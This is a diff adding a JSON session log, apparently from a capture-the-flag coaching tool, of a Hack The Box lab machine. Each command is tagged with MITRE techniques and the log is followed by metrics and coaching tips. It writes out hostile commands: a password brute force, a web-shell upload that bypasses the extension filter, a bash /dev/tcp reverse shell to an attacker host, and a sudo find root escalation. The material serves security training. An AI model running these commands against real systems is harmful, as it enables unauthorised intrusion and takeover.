@@ -1,0 +1,96 @@
+{
+  "schema_version": "1.0",
+  "session": {
+    "uuid": "b3f1c9a2-7d4e-4a6b-9c8f-2e1d5a0f6b34",
+    "started_at": "2026-06-15T19:04:00Z",
+    "ended_at": "2026-06-15T20:32:00Z",
+    "target_scope": "HTB :: Uploadr (10.10.10.5) — easy",
+    "context_path": "host",
+    "shell": "/usr/bin/zsh",
+    "source": "local_pty",
+    "machine": { "name": "Uploadr", "slug": "uploadr", "os": "Linux", "difficulty": "Easy", "avatar": null, "points": 20, "retired": true }
+  },
+  "episodes": [
+    { "seq": 1, "cmd": "nmap -sV -sC -oN nmap.txt 10.10.10.5", "binary": "nmap", "duration_ms": 95000, "gap_before_ms": 8000, "exit_code": 0, "actor": "machine_bound", "output_digest": "22/tcp ssh OpenSSH 7.6p1, 80/tcp http Apache 2.4.29 (Ubuntu)", "tactic": "TA0007", "technique": "T1046", "confidence": 0.98, "noise_weight": 4, "volume": 1, "context_path": "host", "alignment": "match" },
+    { "seq": 2, "cmd": "nmap -p- --min-rate 5000 10.10.10.5", "binary": "nmap", "duration_ms": 142000, "gap_before_ms": 12000, "exit_code": 0, "actor": "machine_bound", "output_digest": "full 65535-port sweep: only 22 and 80 open", "tactic": "TA0007", "technique": "T1046", "confidence": 0.95, "noise_weight": 5, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 3, "cmd": "whatweb http://10.10.10.5", "binary": "whatweb", "duration_ms": 4200, "gap_before_ms": 9000, "exit_code": 0, "actor": "human_active", "output_digest": "Apache/2.4.29, PHP/7.2, jQuery; title: \"Uploadr — share your files\"", "tactic": "TA0007", "technique": "T1595", "confidence": 0.8, "noise_weight": 2, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 4, "cmd": "curl -s http://10.10.10.5/", "binary": "curl", "duration_ms": 600, "gap_before_ms": 15000, "exit_code": 0, "actor": "human_active", "output_digest": "landing page references /upload.php and an /admin area", "tactic": "TA0007", "technique": "T1595", "confidence": 0.7, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 5, "cmd": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php", "binary": "gobuster", "duration_ms": 88000, "gap_before_ms": 22000, "exit_code": 0, "actor": "machine_bound", "output_digest": "200 /index.php /upload.php ; 301 /admin /uploads /css", "tactic": "TA0007", "technique": "T1595.003", "confidence": 0.9, "noise_weight": 6, "volume": 4614, "context_path": "host", "alignment": "match" },
+    { "seq": 6, "cmd": "gobuster dir -u http://10.10.10.5/admin -w common.txt -x php", "binary": "gobuster", "duration_ms": 76000, "gap_before_ms": 14000, "exit_code": 0, "actor": "machine_bound", "output_digest": "200 /admin/login.php ; 403 /admin/config.php", "tactic": "TA0007", "technique": "T1595.003", "confidence": 0.85, "noise_weight": 6, "volume": 4614, "context_path": "host", "alignment": "match" },
+    { "seq": 7, "cmd": "nikto -h http://10.10.10.5", "binary": "nikto", "duration_ms": 130000, "gap_before_ms": 18000, "exit_code": 0, "actor": "machine_bound", "output_digest": "outdated Apache; /upload.php multipart accepted; no CSRF token", "tactic": "TA0007", "technique": "T1595", "confidence": 0.6, "noise_weight": 7, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 8, "cmd": "nmap -sU --top-ports 20 10.10.10.5", "binary": "nmap", "duration_ms": 50000, "gap_before_ms": 12000, "exit_code": 0, "actor": "machine_bound", "output_digest": "UDP top-20: all open|filtered — no new attack surface", "tactic": "TA0007", "technique": "T1046", "confidence": 0.5, "noise_weight": 5, "volume": 1, "context_path": "host", "alignment": "detour" },
+
+    { "seq": 9, "cmd": "searchsploit uploadr", "binary": "searchsploit", "duration_ms": 1200, "gap_before_ms": 35000, "exit_code": 1, "actor": "human_active", "output_digest": "no public exploit for this app", "tactic": "TA0001", "technique": "T1190", "confidence": 0.5, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 10, "cmd": "curl -s http://10.10.10.5/admin/login.php", "binary": "curl", "duration_ms": 500, "gap_before_ms": 28000, "exit_code": 0, "actor": "human_active", "output_digest": "login form; HTML comment leaks \"default admin/admin until launch\"", "tactic": "TA0001", "technique": "T1190", "confidence": 0.6, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 11, "cmd": "hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/admin/login.php:user=^USER^&pass=^PASS^:Invalid'", "binary": "hydra", "duration_ms": 90000, "gap_before_ms": 15000, "exit_code": 1, "actor": "machine_bound", "output_digest": "0 valid creds after 14.3M attempts — server rate-limited", "tactic": "TA0001", "technique": "T1110", "confidence": 0.7, "noise_weight": 10, "volume": 14344384, "context_path": "host", "alignment": "detour" },
+    { "seq": 12, "cmd": "curl -s -c c.txt -d 'user=admin&pass=admin' http://10.10.10.5/admin/login.php", "binary": "curl", "duration_ms": 700, "gap_before_ms": 18000, "exit_code": 0, "actor": "human_active", "output_digest": "302 -> /admin/dashboard.php; auth cookie set (default creds worked)", "tactic": "TA0001", "technique": "T1190", "confidence": 0.9, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "match" },
+    { "seq": 13, "cmd": "curl -s -b c.txt http://10.10.10.5/admin/dashboard.php", "binary": "curl", "duration_ms": 600, "gap_before_ms": 12000, "exit_code": 0, "actor": "human_active", "output_digest": "authenticated file manager -> POST to /upload.php", "tactic": "TA0001", "technique": "T1190", "confidence": 0.85, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 14, "cmd": "curl -s -b c.txt -F 'file=@shell.php' http://10.10.10.5/upload.php", "binary": "curl", "duration_ms": 900, "gap_before_ms": 30000, "exit_code": 0, "actor": "human_active", "output_digest": "rejected: extension filter blocks .php", "tactic": "TA0001", "technique": "T1190", "confidence": 0.8, "noise_weight": 2, "volume": 1, "context_path": "host", "alignment": "alternative", "loop_of_seq": 15 },
+    { "seq": 15, "cmd": "curl -s -b c.txt -F 'file=@shell.phtml' http://10.10.10.5/upload.php", "binary": "curl", "duration_ms": 800, "gap_before_ms": 22000, "exit_code": 0, "actor": "human_active", "output_digest": "accepted -> /uploads/shell.phtml (200)", "tactic": "TA0001", "technique": "T1190", "confidence": 0.92, "noise_weight": 2, "volume": 1, "context_path": "host", "alignment": "match" },
+
+    { "seq": 16, "cmd": "curl -s 'http://10.10.10.5/uploads/shell.phtml?cmd=id'", "binary": "curl", "duration_ms": 600, "gap_before_ms": 15000, "exit_code": 0, "actor": "human_active", "output_digest": "uid=33(www-data) gid=33(www-data)", "tactic": "TA0002", "technique": "T1059", "confidence": 0.9, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "match" },
+    { "seq": 17, "cmd": "nc -lvnp 4444", "binary": "nc", "duration_ms": 1000, "gap_before_ms": 20000, "exit_code": 0, "actor": "human_active", "output_digest": "listener on 0.0.0.0:4444", "tactic": "TA0002", "technique": "T1059", "confidence": 0.9, "noise_weight": 1, "volume": 1, "context_path": "host", "alignment": "alternative" },
+    { "seq": 18, "cmd": "curl -s 'http://10.10.10.5/uploads/shell.phtml?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/10.10.14.7/4444+0>%261\"'", "binary": "curl", "duration_ms": 1500, "gap_before_ms": 18000, "exit_code": 0, "actor": "human_active", "output_digest": "reverse shell caught: www-data@uploadr", "tactic": "TA0002", "technique": "T1059", "confidence": 0.95, "noise_weight": 2, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 19, "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "binary": "python3", "duration_ms": 800, "gap_before_ms": 30000, "exit_code": 0, "actor": "human_active", "output_digest": "TTY upgraded; stable interactive shell", "tactic": "TA0002", "technique": "T1059", "confidence": 0.9, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "match" },
+    { "seq": 20, "cmd": "cat /home/dev/user.txt", "binary": "cat", "duration_ms": 200, "gap_before_ms": 9000, "exit_code": 0, "actor": "human_active", "output_digest": "user flag captured — world-readable as www-data", "tactic": "TA0002", "technique": "T1083", "confidence": 0.92, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "match" },
+
+    { "seq": 21, "cmd": "id; uname -a; hostname", "binary": "id", "duration_ms": 300, "gap_before_ms": 15000, "exit_code": 0, "actor": "human_active", "output_digest": "uid=33(www-data); Linux 4.15.0-29-generic x86_64", "tactic": "TA0004", "technique": "T1033", "confidence": 0.8, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 22, "cmd": "wget 10.10.14.7/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh", "binary": "linpeas", "duration_ms": 185000, "gap_before_ms": 40000, "exit_code": 0, "actor": "machine_bound", "output_digest": "no exotic SUID; sudo entry present for www-data; kernel dated; cron clean", "tactic": "TA0004", "technique": "T1068", "confidence": 0.7, "noise_weight": 3, "volume": 1, "context_path": "host:shell", "alignment": "match" },
+    { "seq": 23, "cmd": "pspy64 -pf -i 1000", "binary": "pspy", "duration_ms": 240000, "gap_before_ms": 35000, "exit_code": 0, "actor": "machine_bound", "output_digest": "watched processes for 4m: no privileged cron, no scheduled task", "tactic": "TA0004", "technique": "T1057", "confidence": 0.6, "noise_weight": 2, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 24, "cmd": "find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null", "binary": "find", "duration_ms": 9000, "gap_before_ms": 55000, "exit_code": 0, "actor": "human_active", "output_digest": "standard SUID set only; no unusual file capabilities", "tactic": "TA0004", "technique": "T1083", "confidence": 0.6, "noise_weight": 2, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 25, "cmd": "cat /etc/crontab; ls -la /etc/cron.*; sudo --version", "binary": "cat", "duration_ms": 5000, "gap_before_ms": 115000, "exit_code": 0, "actor": "human_active", "output_digest": "nothing writable; sudo 1.8.21 (not the CVE-2021-3156 range)", "tactic": "TA0004", "technique": "T1083", "confidence": 0.5, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 26, "cmd": "./linux-exploit-suggester.sh", "binary": "linux-exploit-suggester", "duration_ms": 60000, "gap_before_ms": 85000, "exit_code": 0, "actor": "machine_bound", "output_digest": "suggests 3 kernel CVEs, all flagged 'unreliable / may crash'", "tactic": "TA0004", "technique": "T1068", "confidence": 0.4, "noise_weight": 2, "volume": 1, "context_path": "host:shell", "alignment": "alternative" },
+    { "seq": 27, "cmd": "", "binary": "", "duration_ms": 0, "gap_before_ms": 1380000, "exit_code": null, "actor": "think_pause", "output_digest": "long pause — re-reading linpeas, chasing kernel exploits, searching the web", "tactic": "TA0004", "confidence": 0.0, "noise_weight": 0, "volume": 0, "context_path": "host:shell", "alignment": null },
+    { "seq": 28, "cmd": "sudo -l", "binary": "sudo", "duration_ms": 500, "gap_before_ms": 8000, "exit_code": 0, "actor": "human_active", "output_digest": "(ALL) NOPASSWD: /usr/bin/find  <-- trivial root, in linpeas output all along", "tactic": "TA0004", "technique": "T1548", "confidence": 0.98, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "match" },
+    { "seq": 29, "cmd": "sudo find . -exec /bin/sh \\; -quit", "binary": "sudo", "duration_ms": 600, "gap_before_ms": 10000, "exit_code": 0, "actor": "human_active", "output_digest": "# id -> uid=0(root) (GTFOBins find)", "tactic": "TA0004", "technique": "T1548", "confidence": 0.98, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "match" },
+    { "seq": 30, "cmd": "cat /root/root.txt", "binary": "cat", "duration_ms": 200, "gap_before_ms": 6000, "exit_code": 0, "actor": "human_active", "output_digest": "root flag captured", "tactic": "TA0004", "technique": "T1083", "confidence": 0.9, "noise_weight": 1, "volume": 1, "context_path": "host:shell", "alignment": "match" }
+  ],
+  "phases": [
+    { "mitre_tactic": "TA0007", "label": "Discovery", "started_at": "2026-06-15T19:04:08Z", "ended_at": "2026-06-15T19:14:38Z", "efficiency_pct": 91 },
+    { "mitre_tactic": "TA0001", "label": "Initial Access", "started_at": "2026-06-15T19:14:38Z", "ended_at": "2026-06-15T19:22:10Z", "efficiency_pct": 47 },
+    { "mitre_tactic": "TA0002", "label": "Execution", "started_at": "2026-06-15T19:22:10Z", "ended_at": "2026-06-15T19:24:23Z", "efficiency_pct": 100 },
+    { "mitre_tactic": "TA0004", "label": "Privilege Escalation", "started_at": "2026-06-15T19:24:23Z", "ended_at": "2026-06-15T20:00:00Z", "efficiency_pct": 40 }
+  ],
+  "golden_dag": [
+    { "objective": "enumerate_services", "tactic": "TA0007", "satisfied_by": ["nmap", "rustscan", "masscan"], "depends_on": [], "user_satisfied_by_seq": 1 },
+    { "objective": "enumerate_web_content", "tactic": "TA0007", "satisfied_by": ["gobuster", "ffuf", "feroxbuster"], "depends_on": ["enumerate_services"], "user_satisfied_by_seq": 5 },
+    { "objective": "locate_admin_panel", "tactic": "TA0007", "satisfied_by": ["gobuster", "manual browsing"], "depends_on": ["enumerate_web_content"], "user_satisfied_by_seq": 6 },
+    { "objective": "obtain_admin_access", "tactic": "TA0001", "satisfied_by": ["default credentials", "sqlmap", "auth bypass"], "depends_on": ["locate_admin_panel"], "user_satisfied_by_seq": 12 },
+    { "objective": "bypass_upload_filter", "tactic": "TA0001", "satisfied_by": ["phtml/php5 extension", "magic-byte spoof", "content-type"], "depends_on": ["obtain_admin_access"], "user_satisfied_by_seq": 15 },
+    { "objective": "achieve_code_execution", "tactic": "TA0002", "satisfied_by": ["web shell", "reverse shell"], "depends_on": ["bypass_upload_filter"], "user_satisfied_by_seq": 16 },
+    { "objective": "stabilize_shell", "tactic": "TA0002", "satisfied_by": ["pty upgrade", "ssh key drop"], "depends_on": ["achieve_code_execution"], "user_satisfied_by_seq": 19 },
+    { "objective": "capture_user_flag", "tactic": "TA0002", "satisfied_by": ["cat user.txt"], "depends_on": ["stabilize_shell"], "user_satisfied_by_seq": 20 },
+    { "objective": "enumerate_privesc_surface", "tactic": "TA0004", "satisfied_by": ["linpeas", "manual enumeration"], "depends_on": ["stabilize_shell"], "user_satisfied_by_seq": 22 },
+    { "objective": "find_sudo_misconfig", "tactic": "TA0004", "satisfied_by": ["sudo -l"], "depends_on": ["stabilize_shell"], "user_satisfied_by_seq": 28 },
+    { "objective": "escalate_to_root", "tactic": "TA0004", "satisfied_by": ["GTFOBins sudo find", "GTFOBins"], "depends_on": ["find_sudo_misconfig"], "user_satisfied_by_seq": 29 },
+    { "objective": "capture_root_flag", "tactic": "TA0004", "satisfied_by": ["cat root.txt"], "depends_on": ["escalate_to_root"], "user_satisfied_by_seq": 30 },
+    { "objective": "test_credential_reuse_ssh", "tactic": "TA0001", "satisfied_by": ["ssh admin@target", "credential spraying"], "depends_on": ["obtain_admin_access"], "user_satisfied_by_seq": null }
+  ],
+  "metrics": {
+    "efficiency_pct": 53,
+    "time_waster": { "productive_ms": 1748300, "detour_ms": 167000, "stuck_ms": 1350000, "loop_ms": 30900, "t_active_ms": 3296200 },
+    "stealth_score": 53,
+    "loud_moments": [
+      { "seq": 11, "noise": 81.6 },
+      { "seq": 5, "noise": 28.0 },
+      { "seq": 6, "noise": 28.0 }
+    ],
+    "independence": {
+      "score": 78,
+      "signals": { "think_pause_presence": 0.05, "typo_entropy": 0.71, "paste_burst_ratio": 0.18, "cohort_uniqueness": 0.66 }
+    },
+    "objective_coverage_pct": 92,
+    "technique_breadth": 11
+  },
+  "coaching": {
+    "skill_radar": { "recon": 88, "web": 74, "exploit": 70, "privesc": 45, "opsec": 52 },
+    "next_steps": [
+      { "action": "Run `sudo -l` first.", "why": "It was the whole privesc — and it was sitting in your linpeas output 23 minutes before you ran it.", "category": "PrivEsc", "evidence_seq": 28 },
+      { "action": "Try default credentials before brute-forcing.", "why": "`admin/admin` was hinted in an HTML comment; the 14M-attempt hydra run was pure noise (and your loudest moment).", "category": "Access", "evidence_seq": 11 },
+      { "action": "Don't chase kernel exploits on an easy box.", "why": "`linux-exploit-suggester` itself flagged them as unreliable. Exhaust `sudo -l`, SUID, cron, and capabilities first.", "category": "PrivEsc", "evidence_seq": 26 },
+      { "action": "Test credential reuse against SSH.", "why": "You never tried the admin password against SSH — a free check you skipped.", "category": "Access", "evidence_seq": null }
+    ]
+  },
+  "replay": { "cast_ref": null, "inline_cast": null },
+  "redaction_profile": "public_safe"
+}
